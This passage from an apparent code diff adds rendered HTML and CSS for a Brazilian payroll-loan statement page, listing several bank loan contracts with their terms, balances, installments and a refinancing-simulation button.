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" width="48" height="48" />
+                <label>623</label>
+              </div>
+              
+              <div class="left detail">
+                                <div class="timeleft right">
+                  <ul>
+                    <li class="numeric" title="Prazo">72</li>
+                    <li class="numeric" title="Restam"><div></div>69</li>
+                    <li class="numeric" title="Pagas"><div></div>3</li>
+                  </ul>
+                </div>
+                                <h4>PAN</h4>
+                <span class="numeric"><i></i>311079587-3</span>
+                <div class="timming">
+                  <ul>
+                    <li><label>Data Início:&nbsp;</label><span class="numeric">08/2016</span></li>
+                    <li><label>Data Término:&nbsp;</label><span class="numeric">08/2022</span></li>
+                  </ul>
+                  <div class="clear"></div>
+                </div>
+              </div>
+            </div>
+            
+            <div class="empvalues left">
+              <ul>
+                                <li class="left"><span class="numeric" data-currency="true">971.99</span><label>Valor Empréstimo - Tx: 2.53%</label></li>                  
+                                <li class="right"><span class="numeric" data-currency="true">975.52</span><label>Saldo Devedor</label></li>
+                                <li class="center"><span class="numeric" data-currency="true">29.50</span><label>Valor Parcela</label></li>
+              </ul>
+              <div class="clear"></div>
+                            <p>Este contrato foi realizado por correspondente e pode ser refinanciado normalmente por qualquer correspondente.</p>
+                          </div>
+          
+            <div class="empsimulation left" data-type="refinanciamento">
+              <div class="left result">
+                <i></i>
+                <div class="left">
+                  <span class="numeric" data-currency="true">0</span>
+                  <label>Valor Líquido Cliente</label>
+                </div>
+              </div>
+              <div class="right">
+                                <button class="btn btn-sm btn-primary" data-type="false" data-toggle="modal" data-target="#hisconsimulator">Simular</button>
+                              </div>
+              <div class="clear" style="height:15px"></div>
+              <ul>
+                                <li><i></i>0,02992</li>
+                <li><i></i>Refinanciamento</li>
+                              </ul>
+            </div>
+            <div class="clear"></div>
+          </div>
+                    <style type="text/css">
+          /********************************************************************************* SCHEME COLORS BANKS **********************************************************
+          *****************************************************************************************************************************************************************
+          *****************************************************************************************************************************************************************/
+          #hiscon #emp[data-codbanco='029'] .empinfo .detail > span,
+          #hiscon #emp[data-codbanco='029'] .empinfo .detail .timeleft ul li {
+              color:#FF7F00 !important;
+          }
+          #hiscon #emp[data-codbanco='029'] .empinfo .detail .timeleft ul li:nth-child(1) {
+              border-color:#FF7F00 !important;
+          }
+          #hiscon #emp[data-codbanco='029'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:before {
+              border-color:transparent #FF7F00 #FF7F00 #FF7F00 !important;
+          }
+          #hiscon #emp[data-codbanco='029'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:after {
+              border-color:transparent transparent transparent #FF7F00 !important;
+          }
+          </style>
+          <div id="emp" data-type="98" data-key="55d2ea4bef18c06b4f4a71a19981d503" data-codbanco="029" data-saldo="473.89" data-pmt="15.28" data-prazo="72">
+            <div class="empinfo left">
+              <div class="left image">
+                <img src="data:image/png;base64,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" width="48" height="48" />
+                <label>029</label>
+              </div>
+              
+              <div class="left detail">
+                                <div class="timeleft right">
+                  <ul>
+                    <li class="numeric" title="Prazo">72</li>
+                    <li class="numeric" title="Restam"><div></div>53</li>
+                    <li class="numeric" title="Pagas"><div></div>19</li>
+                  </ul>
+                </div>
+                                <h4>ITAU CONSIG</h4>
+                <span class="numeric"><i></i>559020571</span>
+                <div class="timming">
+                  <ul>
+                    <li><label>Data Início:&nbsp;</label><span class="numeric">04/2015</span></li>
+                    <li><label>Data Término:&nbsp;</label><span class="numeric">04/2021</span></li>
+                  </ul>
+                  <div class="clear"></div>
+                </div>
+              </div>
+            </div>
+            
+            <div class="empvalues left">
+              <ul>
+                                <li class="left"><span class="numeric" data-currency="true">532.78</span><label>Valor Empréstimo - Tx: 2.32%</label></li>                  
+                                <li class="right"><span class="numeric" data-currency="true">473.89</span><label>Saldo Devedor</label></li>
+                                <li class="center"><span class="numeric" data-currency="true">15.28</span><label>Valor Parcela</label></li>
+              </ul>
+              <div class="clear"></div>
+                            <p>Este contrato foi realizado por correspondente e pode ser refinanciado normalmente por qualquer correspondente.</p>
+                          </div>
+          
+            <div class="empsimulation left" data-type="refinanciamento">
+              <div class="left result">
+                <i></i>
+                <div class="left">
+                  <span class="numeric" data-currency="true">0</span>
+                  <label>Valor Líquido Cliente</label>
+                </div>
+              </div>
+              <div class="right">
+                                <button class="btn btn-sm btn-primary" data-type="false" data-toggle="modal" data-target="#hisconsimulator">Simular</button>
+                              </div>
+              <div class="clear" style="height:15px"></div>
+              <ul>
+                                <li><i></i>0,02992</li>
+                <li><i></i>Refinanciamento</li>
+                              </ul>
+            </div>
+            <div class="clear"></div>
+          </div>
+                    <style type="text/css">
+          /********************************************************************************* SCHEME COLORS BANKS **********************************************************
+          *****************************************************************************************************************************************************************
+          *****************************************************************************************************************************************************************/
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail > span,
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail .timeleft ul li {
+              color:#AAAAAA !important;
+          }
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail .timeleft ul li:nth-child(1) {
+              border-color:#AAAAAA !important;
+          }
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:before {
+              border-color:transparent #AAAAAA #AAAAAA #AAAAAA !important;
+          }
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:after {
+              border-color:transparent transparent transparent #AAAAAA !important;
+          }
+          </style>
+          <div id="emp" data-type="98" data-key="9558bcda92c7a486cd96d9a5d7fea3ab" data-codbanco="389" data-saldo="5237.14" data-pmt="171.50" data-prazo="72">
+            <div class="empinfo left">
+              <div class="left image">
+                <img src="" width="48" height="48" />
+                <label>389</label>
+              </div>
+              
+              <div class="left detail">
+                                <div class="timeleft right">
+                  <ul>
+                    <li class="numeric" title="Prazo">72</li>
+                    <li class="numeric" title="Restam"><div></div>51</li>
+                    <li class="numeric" title="Pagas"><div></div>21</li>
+                  </ul>
+                </div>
+                                <h4>MERCANTIL</h4>
+                <span class="numeric"><i></i>013354736</span>
+                <div class="timming">
+                  <ul>
+                    <li><label>Data Início:&nbsp;</label><span class="numeric">02/2015</span></li>
+                    <li><label>Data Término:&nbsp;</label><span class="numeric">02/2021</span></li>
+                  </ul>
+                  <div class="clear"></div>
+                </div>
+              </div>
+            </div>
+            
+            <div class="empvalues left">
+              <ul>
+                                <li class="left"><span class="numeric" data-currency="true">6040.32</span><label>Valor Empréstimo - Tx: 2.28%</label></li>                  
+                                <li class="right"><span class="numeric" data-currency="true">5237.14</span><label>Saldo Devedor</label></li>
+                                <li class="center"><span class="numeric" data-currency="true">171.50</span><label>Valor Parcela</label></li>
+              </ul>
+              <div class="clear"></div>
+                            <p>Este contrato foi realizado por correspondente e pode ser refinanciado normalmente por qualquer correspondente.</p>
+                          </div>
+          
+            <div class="empsimulation left" data-type="refinanciamento">
+              <div class="left result">
+                <i></i>
+                <div class="left">
+                  <span class="numeric" data-currency="true">0</span>
+                  <label>Valor Líquido Cliente</label>
+                </div>
+              </div>
+              <div class="right">
+                                <button class="btn btn-sm btn-primary" data-type="false" data-toggle="modal" data-target="#hisconsimulator">Simular</button>
+                              </div>
+              <div class="clear" style="height:15px"></div>
+              <ul>
+                                <li><i></i>0,02992</li>
+                <li><i></i>Refinanciamento</li>
+                              </ul>
+            </div>
+            <div class="clear"></div>
+          </div>
+                    <style type="text/css">
+          /********************************************************************************* SCHEME COLORS BANKS **********************************************************
+          *****************************************************************************************************************************************************************
+          *****************************************************************************************************************************************************************/
+          #hiscon #emp[data-codbanco='394'] .empinfo .detail > span,
+          #hiscon #emp[data-codbanco='394'] .empinfo .detail .timeleft ul li {
+              color:#CC092F !important;
+          }
+          #hiscon #emp[data-codbanco='394'] .empinfo .detail .timeleft ul li:nth-child(1) {
+              border-color:#CC092F !important;
+          }
+          #hiscon #emp[data-codbanco='394'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:before {
+              border-color:transparent #CC092F #CC092F #CC092F !important;
+          }
+          #hiscon #emp[data-codbanco='394'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:after {
+              border-color:transparent transparent transparent #CC092F !important;
+          }
+          </style>
+          <div id="emp" data-type="98" data-key="d22d4a3256f2433838416805df00c168" data-codbanco="394" data-saldo="703.87" data-pmt="31.99" data-prazo="60">
+            <div class="empinfo left">
+              <div class="left image">
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAA3NCSVQICAjb4U/gAAABzlBMVEX////MCS7MCS7MCS7MCS7MCS7MCS7MCS7MCS7MCS7MCS7////++vv99/j99fb88/X88fP87/H77/H77fD77O/76ez65+v54+j54+f54eb43+T43eL42+H32d/319321dz21Nv20tn10Nj1zdT0ydHzx8/zxc3zw83ywsvyvsjxvcfxu8XxusTwt8LwtcHur7vuq7ntqrftprTrn6/rnq3qm6rplKXpk6Ppj5/njp/ni53miZrlg5Xmgpblf5PkfZHjeo3jeIzjdovjdIricojicIbhb4Xfbn7gbYLgaYDfZXvfZX3eYnneYnreXnfdXnTdXnfdWXLdVnDcVW7bVmvbU23bT2raTmfaTGjZS2XaSmfZSmbZSGPYRmLYR1/YRGHYQ2DXQFzWPVrVOVXUMFDUL07SJkjRJUTRIkXRIULQIEHRHkLQHj/QHkDQHUDQGz/PGj3PGDrPFjrOFDjOFDbNEzXOEjfOEjXOETbNEDPNDzTNDjLNDDLMDC/MDDDMCjDMCS7MCTDLCivMCC7LBizMBi3LBirLBCvLBCrKBCfKAyjLAinKAibLACjJACLKACbKACTJACTIAB7IACDIAB3HABrHABzGABfGABjEAA1Ha61bAAAAmnRSTlMAESIzRIiZqrvd7v//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////4frHeQAAAAlwSFlzAAAt1AAALdQBGGHFaQAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNui8sowAAAKWSURBVEiJ7dXpW9MwGADwOhRl73ACG1MEFTk8GcjwGIIoKCqoeCIeeCAi4gHbFIEJTWlGi4XUpp3Hf2vG7CO0GW5+9v3Qp0+aX/L2bZoIKM8o2eYR1iJfkCFbCgMIeYsKBMjrKRCg4kIBS4r/QE7JuaZwtymEklVVZ1fsfljiBOIqjd0501RXW9/c8XiBKpIzJyegE6cDYEfo/DyRNgWyNVCW6emra422nzy6CyqfW5sBmV7IdK+58tawLIuS2QfHoI9KOYFEb7Du/q5ZfeEzNigl7MXvlw0auUAqPbWTgfKG3YFAaP+Rtp7hGKHp8dElLpAUip8cho1RFr6W+E5EHpD0WEcw0yd8d+jps0e3e6NNoTUTPBujMgesjNQ0Xu4CKJ38QYhBCLVIcqS9KkMCfaYqugB+M0Z+RgFO/KkiNqz5gQMZEllW3SlhTSbHAW7S9QljutTtY6KFpDhVkvUGgFF9PWDjpF9UMnGR5gD+KRVtDMl66Qeo+KS4ASJhCE4rDoDEdC+bYohwAI1CedwFkJpgy+sq5QByD3xjq7/HlU3TzH4yWWOlumVygMKGsqdOzVzv7x9c+4GUZBB84xoHIOsUtH/L3mqvWeK1X9k3FukQQBuvSgh9mfBVqdmKaxOlAI06A+ryQaj6qHKBZF2ChyzZFMY2kFQrAtWvDJELkGw271lMoeTMnA1wsgVaPxD3WrLfG0dGNbOn8pD+PguMSP2wqa1b4A4gYiIj2gl7bSDHdbJhh3LtGizoOdhnA4QdG9pfgTP+g38GnVCtv2OrtT5f0F3RsDIZCgTCKzyww9Umz8WnkZhIxKc5x5ZX2Op1NWKF/dmKonBOLAaE7Zzm3MGAp1DAS2pzIHiKSwoDglBUnO8s3l/lP97sfO1hdwAAAABJRU5ErkJggg==" width="48" height="48" />
+                <label>394</label>
+              </div>
+              
+              <div class="left detail">
+                                <div class="timeleft right">
+                  <ul>
+                    <li class="numeric" title="Prazo">60</li>
+                    <li class="numeric" title="Restam"><div></div>31</li>
+                    <li class="numeric" title="Pagas"><div></div>29</li>
+                  </ul>
+                </div>
+                                <h4>BRADESCO</h4>
+                <span class="numeric"><i></i>790365170</span>
+                <div class="timming">
+                  <ul>
+                    <li><label>Data Início:&nbsp;</label><span class="numeric">06/2014</span></li>
+                    <li><label>Data Término:&nbsp;</label><span class="numeric">06/2019</span></li>
+                  </ul>
+                  <div class="clear"></div>
+                </div>
+              </div>
+            </div>
+            
+            <div class="empvalues left">
+              <ul>
+                                <li class="left"><span class="numeric" data-currency="true">1034.94</span><label>Valor Empréstimo - Tx: 2.30%</label></li>                  
+                                <li class="right"><span class="numeric" data-currency="true">703.87</span><label>Saldo Devedor</label></li>
+                                <li class="center"><span class="numeric" data-currency="true">31.99</span><label>Valor Parcela</label></li>
+              </ul>
+              <div class="clear"></div>
+                            <p>Este contrato foi realizado por correspondente e pode ser refinanciado normalmente por qualquer correspondente.</p>
+                          </div>
+          
+            <div class="empsimulation left" data-type="refinanciamento">
+              <div class="left result">
+                <i></i>
+                <div class="left">
+                  <span class="numeric" data-currency="true">0</span>
+                  <label>Valor Líquido Cliente</label>
+                </div>
+              </div>
+              <div class="right">
+                                <button class="btn btn-sm btn-primary" data-type="false" data-toggle="modal" data-target="#hisconsimulator">Simular</button>
+                              </div>
+              <div class="clear" style="height:15px"></div>
+              <ul>
+                                <li><i></i>0,02992</li>
+                <li><i></i>Refinanciamento</li>
+                              </ul>
+            </div>
+            <div class="clear"></div>
+          </div>
+                    <style type="text/css">
+          /********************************************************************************* SCHEME COLORS BANKS **********************************************************
+          *****************************************************************************************************************************************************************
+          *****************************************************************************************************************************************************************/
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail > span,
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail .timeleft ul li {
+              color:#AAAAAA !important;
+          }
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail .timeleft ul li:nth-child(1) {
+              border-color:#AAAAAA !important;
+          }
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:before {
+              border-color:transparent #AAAAAA #AAAAAA #AAAAAA !important;
+          }
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:after {
+              border-color:transparent transparent transparent #AAAAAA !important;
+          }
+          </style>
+          <div id="emp" data-type="98" data-key="167128d13667721655284a363c2d2760" data-codbanco="389" data-saldo="912.27" data-pmt="43.50" data-prazo="58">
+            <div class="empinfo left">
+              <div class="left image">
+                <img src="" width="48" height="48" />
+                <label>389</label>
+              </div>
+              
+              <div class="left detail">
+                                <div class="timeleft right">
+                  <ul>
+                    <li class="numeric" title="Prazo">58</li>
+                    <li class="numeric" title="Restam"><div></div>29</li>
+                    <li class="numeric" title="Pagas"><div></div>29</li>
+                  </ul>
+                </div>
+                                <h4>MERCANTIL</h4>
+                <span class="numeric"><i></i>012690937</span>
+                <div class="timming">
+                  <ul>
+                    <li><label>Data Início:&nbsp;</label><span class="numeric">06/2014</span></li>
+                    <li><label>Data Término:&nbsp;</label><span class="numeric">04/2019</span></li>
+                  </ul>
+                  <div class="clear"></div>
+                </div>
+              </div>
+            </div>
+            
+            <div class="empvalues left">
+              <ul>
+                                <li class="left"><span class="numeric" data-currency="true">1379.52</span><label>Valor Empréstimo - Tx: 2.32%</label></li>                  
+                                <li class="right"><span class="numeric" data-currency="true">912.27</span><label>Saldo Devedor</label></li>
+                                <li class="center"><span class="numeric" data-currency="true">43.50</span><label>Valor Parcela</label></li>
+              </ul>
+              <div class="clear"></div>
+                            <p>Este contrato foi realizado por correspondente e pode ser refinanciado normalmente por qualquer correspondente.</p>
+                          </div>
+          
+            <div class="empsimulation left" data-type="refinanciamento">
+              <div class="left result">
+                <i></i>
+                <div class="left">
+                  <span class="numeric" data-currency="true">0</span>
+                  <label>Valor Líquido Cliente</label>
+                </div>
+              </div>
+              <div class="right">
+                                <button class="btn btn-sm btn-primary" data-type="false" data-toggle="modal" data-target="#hisconsimulator">Simular</button>
+                              </div>
+              <div class="clear" style="height:15px"></div>
+              <ul>
+                                <li><i></i>0,02992</li>
+                <li><i></i>Refinanciamento</li>
+                              </ul>
+            </div>
+            <div class="clear"></div>
+          </div>
+                    <style type="text/css">
+          /********************************************************************************* SCHEME COLORS BANKS **********************************************************
+          *****************************************************************************************************************************************************************
+          *****************************************************************************************************************************************************************/
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail > span,
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail .timeleft ul li {
+              color:#AAAAAA !important;
+          }
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail .timeleft ul li:nth-child(1) {
+              border-color:#AAAAAA !important;
+          }
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:before {
+              border-color:transparent #AAAAAA #AAAAAA #AAAAAA !important;
+          }
+          #hiscon #emp[data-codbanco='389'] .empinfo .detail .timeleft ul li:nth-child(n+2) div:after {
+              border-color:transparent transparent transparent #AAAAAA !important;
+          }
+          </style>
+          <div id="emp" data-type="98" data-key="e5c3465f65ac0e05f10cf2b3e75a2225" data-codbanco="389" data-saldo="3596.66" data-pmt="171.50" data-prazo="58">
+            <div class="empinfo left">
+              <div class="left image">
+                <img src="" width="48" height="48" />
+                <label>389</label>
+              </div>
+              
+              <div class="left detail">
+                                <div class="timeleft right">
+                  <ul>
+                    <li class="numeric" title="Prazo">58</li>
+                    <li class="numeric" title="Restam"><div></div>29</li>
+                    <li class="numeric" title="Pagas"><div></div>29</li>
+                  </ul>
+                </div>
+                                <h4>MERCANTIL</h4>
+                <span class="numeric"><i></i>012690885</span>
+                <div class="timming">
+                  <ul>
+                    <li><label>Data Início:&nbsp;</label><span class="numeric">06/2014</span></li>
+                    <li><label>Data Término:&nbsp;</label><span class="numeric">04/2019</span></li>
+                  </ul>
+                  <div class="clear"></div>
+                </div>
+              </div>
+            </div>
+            
+            <div class="empvalues left">
+              <ul>
+                                <li class="left"><span class="numeric" data-currency="true">5438.80</span><label>Valor Empréstimo - Tx: 2.32%</label></li>                  
+                                <li class="right"><span class="numeric" data-currency="true">3596.66</span><label>Saldo Devedor</label></li>
+                                <li class="center"><span class="numeric" data-currency="true">171.50</span><label>Valor Parcela</label></li>
+              </ul>
+              <div class="clear"></div>
+                            <p>Este contrato foi realizado por correspondente e pode ser refinanciado normalmente por qualquer correspondente.</p>
+                          </div>
+          
+            <div class="empsimulation left" data-type="refinanciamento">
+              <div class="left result">
+                <i></i>
+                <div class="left">
+                  <span class="numeric" data-currency="true">0</span>
+                  <label>Valor Líquido Cliente</label>
+                </div>
+              </div>
